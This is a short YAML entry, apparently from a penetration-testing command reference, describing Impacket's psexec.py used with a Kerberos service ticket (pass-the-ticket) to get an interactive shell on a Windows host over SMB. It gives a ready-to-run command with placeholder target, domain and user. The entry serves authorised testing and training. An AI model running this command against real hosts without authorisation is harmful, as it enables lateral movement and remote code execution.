---
description: |
  Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

command: |
  export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass
items:
  - TGS
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
  - https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack
---
